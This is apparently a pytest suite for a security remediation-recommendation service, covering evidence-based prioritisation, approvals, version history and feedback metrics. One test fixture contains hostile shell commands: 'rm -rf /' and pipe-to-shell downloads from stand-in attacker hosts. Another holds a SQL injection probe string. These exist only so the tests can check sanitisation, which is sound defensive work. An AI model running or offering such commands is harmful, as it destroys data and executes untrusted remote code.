"""
Prompt 51: Explainable Security Recommendations and Remediation Prioritization Tests.
Validates:
1. Explainable recommendation generation grounded in actual observation evidence and asset context.
2. Separation of technical severity, business priority, confidence, urgency, and effort.
3. Ranking factor explainability and source evidence tracking.
4. Distinction between VERIFIED_INSTRUCTION, GENERAL_GUIDANCE, and UNVERIFIED_SUGGESTION.
5. Detection of missing prerequisites, compatibility concerns, and dependencies.
6. Rejection of fabricated vendor commands and unverified claims of successful resolution.
7. Governance boundaries: mandatory approvals, separation of duties, and no automated execution.
8. Retesting linkage with independent verification outcomes.
9. Version lineage and audit preservation without silently overwriting history.
10. Usefulness metrics calculated strictly from real database reviews, feedback, and outcomes.
"""
import pytest
from fastapi.testclient import TestClient
from sqlalchemy.orm import Session

from app.models.project import Project, ProjectRole
from app.models.user import User, SystemRole
from app.models.asset import Asset, AssetType, AssetCriticality
from app.models.finding import VulnerabilityFinding, FindingLifecycleStatus
from app.models.assessment import (
    AssessmentJob,
    AssessmentFinding,
    FindingEvidence,
    FindingSeverity,
    FindingConfidence,
    AssessmentStatus,
)
from app.models.risk import (
    RemediationRecommendation,
    RecommendationStatus,
    GuidanceType,
    BusinessPriority,
    RemediationUrgency,
    RecommendationFeedbackType,
    RecommendationFeedback,
)
from app.models.verification import VerificationOutcome, VerificationMethod
from app.services.remediation_service import RemediationPrioritizationService
from app.services.remediation_verification_service import RemediationVerificationService
from app.services.governance_service import ProjectGovernanceService
from app.models.base import utc_now


@pytest.fixture
def sample_asset(db: Session, test_project: Project) -> Asset:
    asset = Asset(
        organization_id=test_project.organization_id,
        project_id=test_project.id,
        asset_type=AssetType.WEB_APP,
        name="Production Customer Portal",
        canonical_identifier="https://portal.acme-defense.local",
        environment="PRODUCTION",
        criticality=AssetCriticality.CRITICAL,
        attributes={"internet_facing": True, "data_classification": "RESTRICTED"},
    )
    db.add(asset)
    db.commit()
    db.refresh(asset)
    return asset


@pytest.fixture
def finding_with_evidence(db: Session, test_project: Project, sample_asset: Asset, tester_user: User) -> VulnerabilityFinding:
    job = AssessmentJob(
        project_id=test_project.id,
        target_input="https://portal.acme-defense.local",
        status=AssessmentStatus.COMPLETED,
        created_by_id=tester_user.id,
    )
    db.add(job)
    db.flush()

    finding = VulnerabilityFinding(
        project_id=test_project.id,
        asset_id=sample_asset.id,
        fingerprint="fp-p51-sqli-portal-01",
        target_value="https://portal.acme-defense.local/api/v1/search",
        title="SQL Injection in search API parameter",
        description="Parameterized query absence allows dynamic SQL interpolation.",
        vuln_id="CWE-89",
        status=FindingLifecycleStatus.CONFIRMED,
        severity=FindingSeverity.CRITICAL,
        confidence=FindingConfidence.CERTAIN,
        cvss_score=9.3,
        is_simulated=False,
    )
    db.add(finding)
    db.flush()

    obs = AssessmentFinding(
        job_id=job.id,
        project_id=test_project.id,
        canonical_finding_id=finding.id,
        target_value=finding.target_value,
        title=finding.title,
        severity=finding.severity,
        confidence=finding.confidence,
    )
    db.add(obs)
    db.flush()

    ev = FindingEvidence(
        finding_id=obs.id,
        evidence_type="HTTP_EXCHANGE",
        payload="GET /api/v1/search?q=' OR 1=1-- HTTP/1.1 -> HTTP 500 SyntaxError",
        sha256_hash="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    )
    db.add(ev)
    db.commit()
    db.refresh(finding)
    return finding


def test_01_explainable_recommendation_verified_catalog_with_evidence(
    db: Session,
    test_project: Project,
    finding_with_evidence: VulnerabilityFinding,
    tester_user: User,
):
    """
    Test 1: Explainable recommendation generation for a catalog pattern with verified evidence.
    Verifies guidance_type, confidence, source evidence tracking, and ranking factors breakdown.
    """
    rec = RemediationPrioritizationService.generate_explainable_recommendation(
        project_id=test_project.id,
        finding_id=finding_with_evidence.id,
        db=db,
        actor=tester_user,
    )

    assert rec.id is not None
    assert rec.guidance_type == GuidanceType.VERIFIED_INSTRUCTION
    assert rec.technical_severity == "CRITICAL"
    assert rec.business_priority == BusinessPriority.P1_CRITICAL
    assert rec.remediation_urgency == RemediationUrgency.IMMEDIATE
    assert rec.confidence >= 0.85
    assert len(rec.source_evidence_ids) > 0
    assert "parameterized" in rec.title.lower() or "parameterized" in rec.description.lower()
    assert rec.ranking_factors["evidence_strength"] == "CONFIRMED"
    assert rec.ranking_factors["asset_criticality"] == "CRITICAL"
    assert rec.ranking_factors["is_internet_facing"] is True
    assert "Ranked P1_CRITICAL" in rec.ranking_factors["factor_explanation"]
    assert "Automated command execution is prohibited" in rec.advisory_disclaimer
    assert rec.is_latest is True
    assert rec.version == 1


def test_02_missing_evidence_lowers_confidence_and_discloses_limitation(
    db: Session,
    test_project: Project,
    tester_user: User,
):
    """
    Test 2: When observation evidence is absent, confidence is penalized and limitations are disclosed.
    """
    finding = VulnerabilityFinding(
        project_id=test_project.id,
        fingerprint="fp-p51-sqli-no-evidence",
        target_value="https://internal.test/query",
        title="SQL Injection reported by hypothetical rule",
        description="Unverified report with no observation records.",
        vuln_id="CWE-89",
        status=FindingLifecycleStatus.DETECTED,
        severity=FindingSeverity.HIGH,
        cvss_score=7.5,
        is_simulated=True,
    )
    db.add(finding)
    db.commit()

    rec = RemediationPrioritizationService.generate_explainable_recommendation(
        project_id=test_project.id,
        finding_id=finding.id,
        db=db,
        actor=tester_user,
    )

    assert rec.source_evidence_ids == []
    assert rec.ranking_factors["evidence_strength"] == "ABSENT_OR_UNVERIFIED"
    assert rec.ranking_factors["evidence_item_count"] == 0
    # Confidence should be penalized compared to confirmed evidence
    assert rec.confidence < 0.80


def test_03_unsupported_product_defaults_to_safe_manual_guidance(
    db: Session,
    test_project: Project,
    tester_user: User,
):
    """
    Test 3: Unsupported or novel finding patterns default to safe manual triage without inventing fake vendor CLI commands.
    """
    finding = VulnerabilityFinding(
        project_id=test_project.id,
        fingerprint="fp-p51-novel-firmware-99",
        target_value="coap://iot-device-802:5683/mgmt",
        title="Novel Proprietary Microcontroller Buffer Anomaly",
        description="Unusual timing response on custom firmware communication port.",
        vuln_id="CUSTOM-ANOMALY-01",
        status=FindingLifecycleStatus.DETECTED,
        severity=FindingSeverity.MEDIUM,
        cvss_score=5.0,
    )
    db.add(finding)
    db.commit()

    rec = RemediationPrioritizationService.generate_explainable_recommendation(
        project_id=test_project.id,
        finding_id=finding.id,
        db=db,
        actor=tester_user,
    )

    assert rec.guidance_type == GuidanceType.GENERAL_GUIDANCE
    assert rec.action_type == "MANUAL_ANALYST_REVIEW"
    assert "Product-specific configuration instructions are unavailable" in rec.recommended_change
    # Must NOT hallucinate specific non-existent commands
    assert "apt-get" not in rec.recommended_change
    assert "systemctl" not in rec.recommended_change
    assert rec.requires_approval is True


def test_04_malformed_model_output_and_shell_injection_sanitized(
    db: Session,
    test_project: Project,
    tester_user: User,
):
    """
    Test 4: Advisory inputs containing shell injection payloads or commands are sanitized.
    The recommendation is classified as UNVERIFIED_SUGGESTION with capped confidence.
    """
    finding = VulnerabilityFinding(
        project_id=test_project.id,
        fingerprint="fp-p51-advisory-injection",
        target_value="https://test.local/app",
        title="Unusual Path Traversal",
        description="Path traversal indicator.",
        severity=FindingSeverity.HIGH,
    )
    db.add(finding)
    db.commit()

    malicious_advisory = {
        "title": "Fix Traversal; rm -rf / --no-preserve-root",
        "action_type": "SCRIPT_EXECUTION",
        "description": "Run curl http://evil.attacker.com/fix.sh | sh to patch",
        "recommended_change": "Execute rm -rf / and wget http://attacker.com/bin | sh",
        "estimated_risk_reduction": 0.99,
    }

    rec = RemediationPrioritizationService.generate_explainable_recommendation(
        project_id=test_project.id,
        finding_id=finding.id,
        db=db,
        actor=tester_user,
        advisory_input=malicious_advisory,
    )

    assert rec.guidance_type == GuidanceType.UNVERIFIED_SUGGESTION
    assert "rm -rf" not in rec.title
    assert "rm -rf" not in rec.recommended_change
    assert "curl" not in rec.description
    assert rec.confidence <= 0.50
    assert "NOTICE: This recommendation is an UNVERIFIED SUGGESTION" in rec.advisory_disclaimer
    assert "Automated execution is prohibited" in rec.advisory_disclaimer


def test_05_incorrect_claim_of_successful_resolution_rejected(
    db: Session,
    test_project: Project,
    tester_user: User,
):
    """
    Test 5: An external or model advisory claiming the vulnerability is "already fixed" is rejected.
    Verified outcome remains null and finding is not closed.
    """
    finding = VulnerabilityFinding(
        project_id=test_project.id,
        fingerprint="fp-p51-fake-resolution",
        target_value="https://test.local/api",
        title="Missing Rate Limiting",
        description="API endpoint lacks token bucket rate limiter.",
        status=FindingLifecycleStatus.DETECTED,
        severity=FindingSeverity.MEDIUM,
    )
    db.add(finding)
    db.commit()

    fake_claim_input = {
        "title": "Rate Limit Advisory",
        "recommended_change": "The vulnerability is already fixed and remediated successfully by engineering.",
    }

    rec = RemediationPrioritizationService.generate_explainable_recommendation(
        project_id=test_project.id,
        finding_id=finding.id,
        db=db,
        actor=tester_user,
        advisory_input=fake_claim_input,
    )

    assert "Unverified claims of resolution are rejected" in rec.recommended_change
    assert rec.verified_outcome is None
    assert rec.verification_id is None
    # Finding must remain DETECTED
    fresh_finding = db.query(VulnerabilityFinding).filter(VulnerabilityFinding.id == finding.id).first()
    assert fresh_finding.status == FindingLifecycleStatus.DETECTED


def test_06_unapproved_remediation_cannot_be_authorized(
    db: Session,
    test_project: Project,
    lead_user: User,
    tester_user: User,
):
    """
    Test 6: Governance enforcement: cannot authorize changes for unapproved or rejected recommendations.
    """
    policy = ProjectGovernanceService.get_or_create_policy(db, test_project.id)
    policy.allow_self_approval_override = True
    db.commit()

    finding = VulnerabilityFinding(
        project_id=test_project.id,
        fingerprint="fp-p51-unapproved-auth",
        target_value="https://test.local/unapproved",
        title="CORS Misconfiguration with Credentials",
        description="Wildcard CORS with credentials enabled.",
        vuln_id="CWE-942",
        status=FindingLifecycleStatus.DETECTED,
        severity=FindingSeverity.HIGH,
    )
    db.add(finding)
    db.commit()

    rec = RemediationPrioritizationService.generate_explainable_recommendation(
        project_id=test_project.id,
        finding_id=finding.id,
        db=db,
        actor=tester_user,
    )

    # Cannot authorize when status is PENDING_REVIEW
    with pytest.raises(ValueError, match="must be 'APPROVED' first"):
        RemediationPrioritizationService.authorize_change(
            project_id=test_project.id,
            recommendation_id=rec.id,
            change_ticket_ref="CHG-2026-999",
            authorizer=lead_user,
            authorizer_role=ProjectRole.LEAD,
            db=db,
        )

    # Reject recommendation
    RemediationPrioritizationService.review_recommendation(
        project_id=test_project.id,
        recommendation_id=rec.id,
        new_status=RecommendationStatus.REJECTED,
        reviewer=lead_user,
        reviewer_role=ProjectRole.LEAD,
        review_notes="Rejected due to architectural incompatibility.",
        db=db,
    )

    # Cannot authorize when REJECTED
    with pytest.raises(ValueError, match="must be 'APPROVED' first"):
        RemediationPrioritizationService.authorize_change(
            project_id=test_project.id,
            recommendation_id=rec.id,
            change_ticket_ref="CHG-2026-999",
            authorizer=lead_user,
            authorizer_role=ProjectRole.LEAD,
            db=db,
        )


def test_07_authorization_failures_enforce_rbac(
    db: Session,
    test_project: Project,
    lead_user: User,
    tester_user: User,
):
    """
    Test 7: Role-based access control: Non-lead users cannot review or authorize remediation plans.
    """
    finding = VulnerabilityFinding(
        project_id=test_project.id,
        fingerprint="fp-p51-rbac-test",
        target_value="https://test.local/rbac",
        title="SQL Injection in auth query parameter",
        description="Requires lead approval to authorize code refactor.",
        vuln_id="CWE-89",
        status=FindingLifecycleStatus.DETECTED,
        severity=FindingSeverity.HIGH,
    )
    db.add(finding)
    db.commit()

    rec = RemediationPrioritizationService.generate_explainable_recommendation(
        project_id=test_project.id,
        finding_id=finding.id,
        db=db,
        actor=tester_user,
    )

    # Tester cannot approve
    with pytest.raises(PermissionError, match="Only Project LEAD or System ADMIN can approve"):
        RemediationPrioritizationService.review_recommendation(
            project_id=test_project.id,
            recommendation_id=rec.id,
            new_status=RecommendationStatus.APPROVED,
            reviewer=tester_user,
            reviewer_role=ProjectRole.TESTER,
            review_notes="Attempted tester approval.",
            db=db,
        )

    # Lead approves recommendation
    RemediationPrioritizationService.review_recommendation(
        project_id=test_project.id,
        recommendation_id=rec.id,
        new_status=RecommendationStatus.APPROVED,
        reviewer=lead_user,
        reviewer_role=ProjectRole.LEAD,
        review_notes="Lead approval granted.",
        db=db,
    )

    # Tester cannot authorize change
    with pytest.raises(PermissionError, match="Only Project LEAD or System ADMIN can authorize"):
        RemediationPrioritizationService.authorize_change(
            project_id=test_project.id,
            recommendation_id=rec.id,
            change_ticket_ref="CHG-2026-TEST",
            authorizer=tester_user,
            authorizer_role=ProjectRole.TESTER,
            db=db,
        )


def test_08_version_lineage_preserves_history_without_overwriting(
    db: Session,
    test_project: Project,
    lead_user: User,
):
    """
    Test 8: Regeneration creates a new version, marks the prior version as not latest,
    and preserves historical decisions without overwriting.
    """
    finding = VulnerabilityFinding(
        project_id=test_project.id,
        fingerprint="fp-p51-version-lineage",
        target_value="https://test.local/versioning",
        title="TLS 1.0 Enabled on Public Endpoint",
        description="Legacy protocol negotiation enabled.",
        vuln_id="CWE-326",
        status=FindingLifecycleStatus.DETECTED,
        severity=FindingSeverity.MEDIUM,
    )
    db.add(finding)
    db.commit()

    # Generate v1
    v1 = RemediationPrioritizationService.generate_explainable_recommendation(
        project_id=test_project.id,
        finding_id=finding.id,
        db=db,
        actor=lead_user,
    )
    assert v1.version == 1
    assert v1.is_latest is True
    assert v1.prior_version_id is None

    # Review v1
    RemediationPrioritizationService.review_recommendation(
        project_id=test_project.id,
        recommendation_id=v1.id,
        new_status=RecommendationStatus.APPROVED,
        reviewer=lead_user,
        reviewer_role=ProjectRole.LEAD,
        review_notes="Approved version 1 for phased rollout.",
        db=db,
    )

    # Force regenerate -> v2
    v2 = RemediationPrioritizationService.generate_explainable_recommendation(
        project_id=test_project.id,
        finding_id=finding.id,
        db=db,
        actor=lead_user,
        force_regenerate=True,
    )

    assert v2.id != v1.id
    assert v2.version == 2
    assert v2.prior_version_id == v1.id
    assert v2.is_latest is True
    assert v2.status == RecommendationStatus.PENDING_REVIEW

    # Check v1 historical preservation
    db.refresh(v1)
    assert v1.is_latest is False
    assert v1.superseded_at is not None
    assert v1.status == RecommendationStatus.APPROVED
    assert "Approved version 1" in v1.review_notes

    # Check versions list
    versions = RemediationPrioritizationService.get_recommendation_versions(
        project_id=test_project.id,
        recommendation_id=v2.id,
        db=db,
    )
    assert len(versions) == 2
    assert [v.version for v in versions] == [1, 2]


def test_09_retesting_links_verified_outcome(
    db: Session,
    test_project: Project,
    lead_user: User,
    tester_user: User,
):
    """
    Test 9: Independent retesting updates the linked recommendation with objective verification outcome.
    """
    finding = VulnerabilityFinding(
        project_id=test_project.id,
        fingerprint="fp-p51-retest-linkage",
        target_value="https://test.local/retest",
        title="RFC 9116 security.txt Missing",
        description="Missing standardized security policy.",
        vuln_id="RFC-9116",
        status=FindingLifecycleStatus.DETECTED,
        severity=FindingSeverity.INFO,
    )
    db.add(finding)
    db.commit()

    rec = RemediationPrioritizationService.generate_explainable_recommendation(
        project_id=test_project.id,
        finding_id=finding.id,
        db=db,
        actor=tester_user,
    )
    assert rec.verified_outcome is None

    # Record independent verification: VERIFIED_FIXED
    verification = RemediationVerificationService.record_verification(
        project_id=test_project.id,
        finding_id=finding.id,
        outcome=VerificationOutcome.VERIFIED_FIXED,
        verification_criteria="HTTP GET /.well-known/security.txt returns 200 with Contact and Expires",
        verification_evidence_summary="Target responded with compliant RFC 9116 security.txt",
        notes="Verified resolved on production edge.",
        verifier=lead_user,
        verifier_role=ProjectRole.LEAD,
        db=db,
        verification_method=VerificationMethod.PASSIVE_SCAN,
        recommendation_id=rec.id,
    )

    db.refresh(rec)
    assert rec.verification_id == verification.id
    assert rec.verified_outcome == "VERIFIED_FIXED"


def test_10_feedback_submission_and_usefulness_metrics_grounded_in_data(
    db: Session,
    test_project: Project,
    lead_user: User,
    tester_user: User,
):
    """
    Test 10: Feedback submission and usefulness metrics are strictly measured from database records.
    Never fabricated.
    """
    finding = VulnerabilityFinding(
        project_id=test_project.id,
        fingerprint="fp-p51-feedback-metrics",
        target_value="https://test.local/feedback",
        title="Cross-Site Scripting (XSS) in Comment Box",
        description="Unescaped HTML reflection.",
        vuln_id="CWE-79",
        status=FindingLifecycleStatus.DETECTED,
        severity=FindingSeverity.HIGH,
    )
    db.add(finding)
    db.commit()

    rec = RemediationPrioritizationService.generate_explainable_recommendation(
        project_id=test_project.id,
        finding_id=finding.id,
        db=db,
        actor=tester_user,
    )

    # Submit feedback 1: HELPFUL
    fb1 = RemediationPrioritizationService.record_feedback(
        project_id=test_project.id,
        recommendation_id=rec.id,
        feedback_type=RecommendationFeedbackType.HELPFUL,
        user=tester_user,
        rating=5,
        comment="CSP recommendation solved the reflection vector perfectly.",
        was_actionable=True,
        applied_as_instructed=True,
        db=db,
    )
    assert fb1.id is not None
    assert fb1.rating == 5

    # Submit feedback 2: INCOMPLETE
    fb2 = RemediationPrioritizationService.record_feedback(
        project_id=test_project.id,
        recommendation_id=rec.id,
        feedback_type=RecommendationFeedbackType.INCOMPLETE,
        user=lead_user,
        rating=3,
        comment="Needed additional instructions for sub-resource integrity.",
        was_actionable=False,
        applied_as_instructed=False,
        db=db,
    )
    assert fb2.id is not None

    # Retrieve metrics
    metrics = RemediationPrioritizationService.get_recommendation_usefulness_metrics(
        project_id=test_project.id,
        db=db,
    )

    assert metrics["total_feedback_count"] >= 2
    assert metrics["by_feedback_type"]["HELPFUL"] >= 1
    assert metrics["by_feedback_type"]["INCOMPLETE"] >= 1
    assert metrics["average_rating"] is not None
    assert metrics["actionable_count"] >= 1
    assert metrics["not_actionable_count"] >= 1
    assert "strictly from actual historical review decisions" in metrics["data_grounding_notice"]


def test_11_api_endpoints_generate_versions_feedback_metrics(
    client: TestClient,
    db: Session,
    test_project: Project,
    lead_headers: dict,
    tester_headers: dict,
):
    """
    Test 11: End-to-end HTTP API tests for Prompt 51 endpoints:
    - POST /projects/{id}/findings/{id}/recommendations/generate
    - GET /projects/{id}/remediations/{id}/versions
    - POST /projects/{id}/remediations/{id}/feedback
    - GET /projects/{id}/remediations/{id}/feedback
    - GET /projects/{id}/remediations/metrics/usefulness
    """
    finding = VulnerabilityFinding(
        project_id=test_project.id,
        fingerprint="fp-p51-api-e2e-01",
        target_value="https://test.local/e2e",
        title="Cache-Control Missing on Private Profile",
        description="Private user PII returned without Cache-Control: no-store.",
        vuln_id="CWE-525",
        status=FindingLifecycleStatus.DETECTED,
        severity=FindingSeverity.LOW,
    )
    db.add(finding)
    db.commit()

    # 1. Generate recommendation via API
    gen_res = client.post(
        f"/api/v1/projects/{test_project.id}/findings/{finding.id}/recommendations/generate",
        headers=tester_headers,
        json={"force_regenerate": False},
    )
    assert gen_res.status_code == 200
    rec_data = gen_res.json()
    assert rec_data["guidance_type"] == "VERIFIED_INSTRUCTION"
    assert rec_data["version"] == 1
    rec_id = rec_data["id"]

    # 2. Get versions via API
    ver_res = client.get(
        f"/api/v1/projects/{test_project.id}/remediations/{rec_id}/versions",
        headers=tester_headers,
    )
    assert ver_res.status_code == 200
    versions = ver_res.json()
    assert len(versions) == 1
    assert versions[0]["id"] == rec_id

    # 3. Submit feedback via API
    fb_res = client.post(
        f"/api/v1/projects/{test_project.id}/remediations/{rec_id}/feedback",
        headers=tester_headers,
        json={
            "feedback_type": "HELPFUL",
            "rating": 5,
            "comment": "Quick and easy header fix.",
            "was_actionable": True,
            "applied_as_instructed": True,
        },
    )
    assert fb_res.status_code == 200
    fb_data = fb_res.json()
    assert fb_data["feedback_type"] == "HELPFUL"
    assert fb_data["rating"] == 5

    # 4. List feedback via API
    list_fb_res = client.get(
        f"/api/v1/projects/{test_project.id}/remediations/{rec_id}/feedback",
        headers=tester_headers,
    )
    assert list_fb_res.status_code == 200
    fb_list = list_fb_res.json()
    assert len(fb_list) >= 1
    assert fb_list[0]["comment"] == "Quick and easy header fix."

    # 5. Get usefulness metrics via API
    metrics_res = client.get(
        f"/api/v1/projects/{test_project.id}/remediations/metrics/usefulness",
        headers=lead_headers,
    )
    assert metrics_res.status_code == 200
    m_data = metrics_res.json()
    assert m_data["project_id"] == test_project.id
    assert m_data["total_recommendations"] >= 1
    assert m_data["total_feedback_count"] >= 1
    assert "synthetic, simulated, or fabricated scores" in m_data["data_grounding_notice"]
